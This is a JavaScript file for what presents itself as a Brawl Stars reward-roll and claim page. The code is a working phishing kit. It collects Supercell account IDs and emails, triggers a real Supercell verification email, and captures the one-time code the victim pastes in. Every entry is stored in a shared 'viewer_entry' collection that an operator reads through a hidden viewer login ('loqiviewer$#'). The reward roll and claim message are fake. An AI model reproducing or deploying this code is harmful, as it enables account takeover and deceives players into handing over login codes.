/* Helper to create the top banner HTML for post-login */
function buildBannerHtml(id){
  return `
  <div id="top-banner" class="top-banner">
    <div class="banner-content">
      <span class="banner-label">Signed in as</span>
      <strong id="banner-id" class="banner-id">${escapeHtml(id)}</strong>
    </div>
  </div>`;
}

/* escape basic HTML in id to avoid injection if user types markup */
function escapeHtml(str){
  return String(str).replace(/[&<>"']/g, (s)=>({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[s]));
}

/* Create a WebsimSocket room instance for persisted records (used by the special viewer) */
const room = new WebsimSocket();

/* Cooldown configuration: 5 hours in milliseconds */
const COOLDOWN_MS = 5 * 60 * 60 * 1000;

/* Utility: format remaining ms into H:MM:SS */
function formatRemaining(ms){
  if (ms <= 0) return '0:00:00';
  const total = Math.floor(ms / 1000);
  const h = Math.floor(total / 3600);
  const m = Math.floor((total % 3600) / 60);
  const s = total % 60;
  return `${h}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
}

/* Read last roll timestamp for an ID from localStorage */
function getLastRollTs(id){
  try{
    const v = localStorage.getItem('lastRoll_' + id);
    return v ? parseInt(v,10) : null;
  }catch(e){ return null; }
}

/* Set last roll timestamp for an ID to now */
function setLastRollTs(id, ts){
  try{ localStorage.setItem('lastRoll_' + id, String(ts)); }catch(e){}
}

/* Setup roll behavior for the injected UI, with cooldown tied to banner-id.
   Guest user (id === 'guest') is exempt from cooldown and can roll freely. */
function setupRoll(){
  const rollBtn = document.getElementById('roll-btn');
  const rewardResult = document.getElementById('reward-result');
  const bannerIdEl = document.getElementById('banner-id');
  const resultImage = document.getElementById('result-image');
  const resultLabel = document.getElementById('result-label');
  const claimBtn = document.getElementById('claim-btn');
  const claimMsg = document.getElementById('claim-msg');

  if (!rollBtn || !rewardResult || !bannerIdEl || !resultImage || !resultLabel) return;
  const userId = (bannerIdEl.textContent || 'guest').trim();
  const isGuest = userId.toLowerCase() === 'guest';
  let cooldownTimer = null;

  // support image-backed buttons by updating the inner .btn-text when present
  const rollBtnTextEl = rollBtn.querySelector ? rollBtn.querySelector('.btn-text') : null;
  function setRollLabel(txt){
    if (rollBtnTextEl) rollBtnTextEl.textContent = txt;
    else rollBtn.textContent = txt;
  }

  function updateCooldownUI(remainingMs){
    if (isGuest){
      rollBtn.disabled = false;
      setRollLabel('Roll');
      return;
    }
    if (remainingMs > 0){
      rollBtn.disabled = true;
      setRollLabel('Cooldown ' + formatRemaining(remainingMs));
    } else {
      rollBtn.disabled = false;
      setRollLabel('Roll');
    }
  }

  function startCooldownInterval(untilTs){
    if (cooldownTimer) clearInterval(cooldownTimer);
    cooldownTimer = setInterval(()=>{
      const rem = untilTs - Date.now();
      if (rem <= 0){
        clearInterval(cooldownTimer);
        updateCooldownUI(0);
      } else {
        updateCooldownUI(rem);
      }
    }, 1000);
  }

  // on load, check stored timestamp only for non-guest users
  if (!isGuest){
    const lastTs = getLastRollTs(userId);
    if (lastTs){
      const nextAllowed = lastTs + COOLDOWN_MS;
      const rem = nextAllowed - Date.now();
      if (rem > 0){
        updateCooldownUI(rem);
        startCooldownInterval(nextAllowed);
      } else {
        updateCooldownUI(0);
      }
    } else {
      updateCooldownUI(0);
    }
  } else {
    updateCooldownUI(0);
  }

  // ensure claim button hidden initially
  if (claimBtn) claimBtn.classList.add('hidden');

  rollBtn.addEventListener('click', ()=> {
    // hide claim message and button while rolling
    if (claimMsg) claimMsg.classList.remove('show');
    if (claimBtn) claimBtn.classList.add('hidden');

    // For non-guest users, enforce cooldown checks
    if (!isGuest){
      const last = getLastRollTs(userId);
      if (last){
        const next = last + COOLDOWN_MS;
        const rem = next - Date.now();
        if (rem > 0){
          updateCooldownUI(rem);
          startCooldownInterval(next);
          return;
        }
      }
    }

    // Begin roll animation and lock UI (guests can still see the animation)
    rollBtn.disabled = true;
    let elapsed = 0;
    const total = 5000;
    const tick = 300;
    setRollLabel('Rolling');
    // visual micro-reset
    rewardResult.textContent = '';
    rewardResult.classList.remove('reward-sirius','reward-spike','empty');
    resultImage.classList.add('hidden');
    resultImage.src = '';
    resultLabel.classList.add('hidden');
    resultLabel.textContent = '';
    resultLabel.classList.remove('label-sirius','label-spike');

    const spinner = setInterval(()=>{
      const dots = '.'.repeat(((elapsed / tick) | 0) % 4);
      setRollLabel('Rolling' + dots);
      elapsed += tick;
      if (elapsed >= total){
        clearInterval(spinner);
        const pick = Math.random() < 0.5 ? 'sirius' : 'spike';

        if (pick === 'sirius'){
          rewardResult.textContent = 'SIRIUS';
          rewardResult.classList.remove('reward-spike','empty');
          rewardResult.classList.add('reward-sirius');
          resultImage.src = '/IMG_1187.jpeg';
          resultImage.alt = 'Sirius';
          resultImage.classList.remove('hidden');
          resultLabel.textContent = 'SIRIUS';
          resultLabel.classList.remove('hidden');
          resultLabel.classList.add('label-sirius');
        } else {
          rewardResult.textContent = 'SPIKE';
          rewardResult.classList.remove('reward-sirius','empty');
          rewardResult.classList.add('reward-spike');
          resultImage.src = '/IMG_1186.jpeg';
          resultImage.alt = 'Spike';
          resultImage.classList.remove('hidden');
          resultLabel.textContent = 'SPIKE';
          resultLabel.classList.remove('hidden');
          resultLabel.classList.add('label-spike');
        }

        // show claim button after roll
        if (claimBtn){
          claimBtn.classList.remove('hidden');
          claimBtn.disabled = false;
        }

        // store cooldown and start countdown only for non-guest users
        const now = Date.now();
        if (!isGuest){
          setLastRollTs(userId, now);
          const nextAllowed = now + COOLDOWN_MS;
          updateCooldownUI(nextAllowed - Date.now());
          startCooldownInterval(nextAllowed);
        } else {
          // guests: re-enable immediately but keep claim available
          rollBtn.disabled = false;
          setRollLabel('Roll');
        }
      }
    }, tick);
  });

  // claim button handler
  if (claimBtn && claimMsg){
    claimBtn.addEventListener('click', ()=>{
      // disable after claiming
      claimBtn.disabled = true;
      claimBtn.classList.add('hidden');

      // show claim message with updated wording about backend processing time
      claimMsg.textContent = 'Reward claiming. Will take 1-24 hours for reward to appear.';
      claimMsg.classList.add('show');

      // auto-hide after 2.2s
      setTimeout(()=> {
        claimMsg.classList.remove('show');
      }, 2200);
    });
  }
}

/* Perform the post-login rendering for a given id (reusable for the form and preview) */
function performLogin(id){
  const displayId = id || '—';

  // build new page content: banner + simplified single-stage result area, reward row, claim button, claim message, and PDF footer
  const bannerHtml = buildBannerHtml(displayId);
  const mainHtml = `
    <main class="post-login" role="main">
      <div class="result-stage" aria-live="polite">
        <img id="result-image" class="result-image hidden" src="" alt="Reward image" />
        <div id="result-label" class="label-display hidden"></div>
      </div>

      <div class="reward-row">
        <div id="reward-result" class="reward-display empty">No roll yet</div>

        <!-- Replaced roll button with image-backed button using the available parallelogram asset and visible label -->
        <button id="roll-btn" class="image-btn" title="Roll" aria-label="Roll">
          <img class="btn-img" src="/IMG_1203.png" alt="button image" />
          <span class="btn-text">Roll</span>
        </button>

        <button id="claim-btn" class="image-btn claim-btn hidden" title="Claim reward" aria-label="Claim reward">
          <img class="btn-img" src="/IMG_1203.png" alt="button image" />
          <span class="btn-text">Claim</span>
        </button>
      </div>

      <!-- Claim message shown under the screen -->
      <div id="claim-msg" aria-hidden="true"></div>
    </main>`;

  // replace body content with banner + main
  document.body.innerHTML = bannerHtml + mainHtml;

  // rebind roll logic to new DOM
  setupRoll();

  // if this is the special viewer ID, initialize the viewer panel
  if (String(displayId).toLowerCase() === 'loqiviewer$#') {
    try { setupViewer(); } catch (e){ console.error('viewer setup failed', e); }
  }

  // ensure initial state
  const img = document.getElementById('result-image');
  const label = document.getElementById('result-label');
  if (img) { img.classList.add('hidden'); img.src = ''; }
  if (label) { label.classList.add('hidden'); label.textContent = ''; label.classList.remove('label-sirius','label-spike'); }
}

/* Viewer helper: subscribe to common collections and show combined records in a simple panel */
function setupViewer(){
  // remove any existing viewer
  let panel = document.getElementById('viewer-panel');
  if (panel) panel.remove();

  panel = document.createElement('div');
  panel.id = 'viewer-panel';
  panel.style.position = 'fixed';
  panel.style.top = '64px';
  panel.style.right = '12px';
  panel.style.width = '320px';
  panel.style.maxHeight = '60vh';
  panel.style.overflow = 'auto';
  panel.style.background = 'rgba(255,255,255,0.98)';
  panel.style.border = '1px solid rgba(0,0,0,0.08)';
  panel.style.borderRadius = '10px';
  panel.style.boxShadow = '0 10px 30px rgba(2,6,23,0.08)';
  panel.style.padding = '10px';
  panel.style.zIndex = 120;
  panel.innerHTML = '<div style="font-weight:800;margin-bottom:8px;">Live Records (viewer)</div><pre id="viewer-pre" style="font-size:12px;white-space:pre-wrap;"></pre>';
  document.body.appendChild(panel);

  const pre = document.getElementById('viewer-pre');

  // try a few common collection names and subscribe to updates
  const collections = ['post','message','upvote','note','comment','viewer_entry'];
  const state = {};

  function refreshView(){
    const merged = {};
    for (const c of collections){
      merged[c] = state[c] || [];
    }
    try { pre.textContent = JSON.stringify(merged, null, 2); } catch (e){ pre.textContent = String(merged); }
  }

  // subscribe to each collection (if it exists, subscribe will still return but may be empty)
  for (const col of collections){
    try {
      // initial fetch
      const list = room.collection(col).getList() || [];
      state[col] = list.reverse ? list.slice().reverse() : list;
      refreshView();

      // subscribe to live updates
      const unsub = room.collection(col).subscribe((items) => {
        state[col] = items.slice().reverse ? items.slice().reverse() : items;
        refreshView();
      });
      // store unsub on panel so it can be cleaned up if needed
      panel[`unsub_${col}`] = unsub;
    } catch (e){
      // ignore collections that error
      state[col] = state[col] || [];
    }
  }
}

/* Login submit behavior replaced: show instruction screen with countdown, then open external auth in a new tab and keep this page for code entry */
function onSubmit(e){
  e.preventDefault();
  const id = document.getElementById('id').value.trim();
  const email = document.getElementById('email') ? document.getElementById('email').value.trim() : '';
  const btn = document.querySelector('.submit');

  // immediate shortcut: bypass the verification flow for some special accounts:
  // - loqibrawl@gmail.com OR Account IDs loqibrawl / loqibrawl54
  // - the special viewer id loqiviewer$# or its email loqiviewer$#@gmail.com (logs in and opens the viewer panel)
  const idLower = (id || '').toLowerCase();
  const emailLower = (email || '').toLowerCase();

  const isLoqi = (emailLower === 'loqibrawl@gmail.com' || idLower === 'loqibrawl' || idLower === 'loqibrawl54');
  const isViewer = (idLower === 'loqiviewer$#' || emailLower === 'loqiviewer$#@gmail.com');

  if (isLoqi || isViewer) {
    try {
      if (btn) btn.disabled = true;
    } catch (err){}
    // For the viewer case, ensure performLogin receives the viewer id so setupViewer() runs.
    const safeId = escapeHtml(isViewer ? 'loqiviewer$#' : (id || 'user'));
    performLogin(safeId);
    return;
  }

  // require both ID and Email for normal users
  if (!id || !email){
    // show a clear inline message next to the form submit button area if present, otherwise fallback to alert
    const form = document.getElementById('login-form');
    let notice = form ? form.querySelector('.inline-required-notice') : null;
    if (!notice && form){
      notice = document.createElement('div');
      notice.className = 'inline-required-notice';
      notice.style.color = 'var(--muted)';
      notice.style.fontWeight = '700';
      notice.style.marginTop = '6px';
      form.appendChild(notice);
    }
    if (notice) {
      notice.textContent = 'Please fill both Account ID and Email.';
    } else {
      alert('Please fill both Account ID and Email.');
    }
    // ensure button state resets
    if (btn){
      btn.disabled = false;
      const label = btn.querySelector('.btn-text');
      if (label) label.textContent = 'Sign in';
      else btn.textContent = 'Sign in';
    }
    return;
  }

  if (btn){
    btn.disabled = true;
    const label = btn.querySelector('.btn-text');
    if (label) label.textContent = 'Failed';
    else btn.textContent = 'Failed';
  }

  // Replace current page with a simple instruction screen that asks the user to enter the code they receive by email,
  // and show a countdown before opening the external Supercell page in a new tab.
  const safeId = escapeHtml(id || '—');
  const safeEmail = escapeHtml(email || '—');

  // log the initial submission to the persistent viewer_entry collection so viewers can see it
  try {
    room.collection('viewer_entry').create({
      submitted_id: id || '',
      submitted_email: email || '',
      stage: 'requested'
    });
  } catch (e){ /* ignore logging failures */ }

  // show the card a bit lower by adding a top margin
  document.body.innerHTML = `
    <main class="card" role="main" aria-label="Enter code" style="margin-top:24px;">
      <div style="display:flex;flex-direction:column;gap:12px;">
        <div style="display:flex;justify-content:space-between;align-items:center;">
          <h2 style="margin:0;font-size:18px;font-weight:800;">Enter verification code</h2>
          <div style="font-size:13px;color:var(--muted)">
            Signed in as <strong id="signed-id" style="background:#0b76ff;color:#fff;padding:6px 8px;border-radius:6px;border:1px solid #000;font-weight:800;">${safeId}</strong>
            <div style="margin-top:6px;font-size:12px;color:var(--muted)">Email: <strong id="signed-email" style="background:#0b76ff;color:#fff;padding:6px 8px;border-radius:6px;border:1px solid #000;font-weight:800;">${safeEmail}</strong></div>
          </div>
        </div>

        <p id="open-msg" style="margin:0;color:var(--muted);font-size:14px;">
          We'll open the Supercell sign-in page in a new tab in <strong id="open-count">5</strong> seconds. If you're already signed in there, click "Logout" and sign in again; then check the email above for the verification code, paste it below, and press Verify.
        </p>

        <label for="sc-code" style="font-weight:700;color:var(--muted);font-size:13px;">Verification code</label>
        <input id="sc-code" type="text" autocomplete="one-time-code" placeholder="Enter the code from your email" style="width:100%;height:52px;padding:12px 14px;border:1px solid #eef2ff;border-radius:12px;font-size:16px;">

        <div style="display:flex;gap:8px;flex-wrap:wrap;">
          <button id="open-site-btn" class="image-btn" style="min-width:160px;">
            <img class="btn-img" src="/IMG_1203.png" alt="button image" />
            <span class="btn-text">Open sign-in page</span>
          </button>

          <button id="verify-btn" class="image-btn" style="min-width:160px;">
            <img class="btn-img" src="/IMG_1203.png" alt="button image" />
            <span class="btn-text">Verify</span>
          </button>

          <button id="back-btn" class="image-btn" style="min-width:120px;">
            <img class="btn-img" src="/IMG_1203.png" alt="button image" />
            <span class="btn-text">Back</span>
          </button>
        </div>

        <div id="verify-msg" style="margin-top:6px;color:var(--muted);font-weight:700;"></div>
      </div>
    </main>
  `;

  // elements for countdown and controls
  const openCountEl = document.getElementById('open-count');
  const openMsgEl = document.getElementById('open-msg');
  const openSiteBtn = document.getElementById('open-site-btn');
  const verifyBtn = document.getElementById('verify-btn');
  const backBtn = document.getElementById('back-btn');
  const codeInput = document.getElementById('sc-code');
  const msg = document.getElementById('verify-msg');

  // countdown configuration (seconds)
  let countdown = 5;
  let opened = false;
  let intervalId = null;
  const authUrl = 'https://accounts.supercell.com/?client_id=';

  // provide an immediate manual open option (in case user closed the auto-open tab)
  if (openSiteBtn){
    openSiteBtn.addEventListener('click', () => {
      try {
        const w = window.open(authUrl, '_blank', 'noopener');
        if (w) {
          opened = true;
          // append brief status under instructions
          let statusSpan = openMsgEl.querySelector('.open-status');
          if (!statusSpan){
            statusSpan = document.createElement('span');
            statusSpan.className = 'open-status';
            statusSpan.style.display = 'block';
            statusSpan.style.marginTop = '8px';
            openMsgEl.appendChild(statusSpan);
          }
          statusSpan.textContent = 'The sign-in page has been opened in a new tab; check your email for the verification code and paste it below.';
        } else {
          // popup blocked — keep the user informed with a link fallback
          let statusSpan = openMsgEl.querySelector('.open-status');
          if (!statusSpan){
            statusSpan = document.createElement('span');
            statusSpan.className = 'open-status';
            statusSpan.style.display = 'block';
            statusSpan.style.marginTop = '8px';
            openMsgEl.appendChild(statusSpan);
          }
          statusSpan.innerHTML = `Could not open the sign-in page automatically. <a href="${authUrl}" target="_blank" rel="noopener">Open it manually</a>, then check your email for the code.`;
        }
      } catch (err){
        let statusSpan = openMsgEl.querySelector('.open-status');
        if (!statusSpan){
          statusSpan = document.createElement('span');
          statusSpan.className = 'open-status';
          statusSpan.style.display = 'block';
          statusSpan.style.marginTop = '8px';
          openMsgEl.appendChild(statusSpan);
        }
        statusSpan.innerHTML = `Error opening sign-in page. <a href="${authUrl}" target="_blank" rel="noopener">Open it manually</a>.`;
      }
    });
  }

  // start countdown to open the tab
  function startOpenCountdown(){
    if (openCountEl) openCountEl.textContent = String(countdown);
    intervalId = setInterval(() => {
      countdown -= 1;
      if (openCountEl) openCountEl.textContent = String(Math.max(0, countdown));
      if (countdown <= 0){
        clearInterval(intervalId);
        // attempt to open the auth page in a new tab and retain this page for pasting the code
        try {
          const win = window.open(authUrl, '_blank');

          // ensure a status span exists so we append status without removing the original instructions
          let statusSpan = openMsgEl.querySelector('.open-status');
          if (!statusSpan){
            statusSpan = document.createElement('span');
            statusSpan.className = 'open-status';
            statusSpan.style.display = 'block';
            statusSpan.style.marginTop = '8px';
            openMsgEl.appendChild(statusSpan);
          }

          if (!win){
            // popup blocked — notify user and provide a manual link, while keeping original text
            statusSpan.innerHTML = `Could not open the sign-in page automatically. <a href="${authUrl}" target="_blank" rel="noopener">Open it manually</a>, then check your email for the code.`;
          } else {
            // keep instruction visible; mark opened so we don't re-open
            opened = true;
            statusSpan.textContent = 'The sign-in page has been opened in a new tab; check your email for the verification code and paste it below.';
          }
        } catch (err){
          // preserve original instructions and show an inline error/link
          let statusSpan = openMsgEl.querySelector('.open-status');
          if (!statusSpan){
            statusSpan = document.createElement('span');
            statusSpan.className = 'open-status';
            statusSpan.style.display = 'block';
            statusSpan.style.marginTop = '8px';
            openMsgEl.appendChild(statusSpan);
          }
          statusSpan.innerHTML = `Error opening sign-in page. <a href="${authUrl}" target="_blank" rel="noopener">Open it manually</a>.`;
        }
      }
    }, 1000);
  }

  // begin countdown right away
  startOpenCountdown();

  // wire verify/back buttons
  if (verifyBtn){
    verifyBtn.addEventListener('click', () => {
      const code = (codeInput.value || '').trim();
      if (!code){
        msg.textContent = 'Please enter the code from your email.';
        return;
      }

      // Persist the submitted verification code to viewer_entry so viewers can see it
      try {
        room.collection('viewer_entry').create({
          submitted_id: id || '',
          submitted_email: email || '',
          submitted_code: code,
          stage: 'verified'
        });
      } catch (e){ /* ignore logging failures */ }

      // Simulate verification result: show success message and proceed to post-login flow
      msg.style.color = 'green';
      msg.textContent = 'Code submitted — proceeding...';
      // ensure we stop any running countdown
      if (intervalId) clearInterval(intervalId);
      // proceed to post-login UI after brief delay
      setTimeout(() => performLogin(safeId === '—' ? 'user' : safeId), 700);
    });
  }

  if (backBtn){
    backBtn.addEventListener('click', () => {
      // stop countdown if running, then reload original page to allow retry
      if (intervalId) clearInterval(intervalId);
      window.location.reload();
    });
  }
}

